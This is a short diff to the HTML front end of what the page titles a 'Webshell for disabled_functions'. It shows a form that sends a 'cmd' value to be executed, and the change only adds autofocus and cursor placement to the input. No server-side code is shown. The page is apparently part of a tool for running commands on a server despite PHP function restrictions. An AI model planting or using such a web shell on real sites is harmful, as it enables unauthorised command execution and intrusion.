@@ -6,7 +6,7 @@
 <h2>Webshell for disabled_functions</h2>
 
 <form method="get">
-    <input type="text" name="cmd" id="cmd"><button type="submit">Execute</button>
+    <input type="text" name="cmd" id="cmd" onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required><button type="submit">Execute</button>
 </form>
 
 </body>
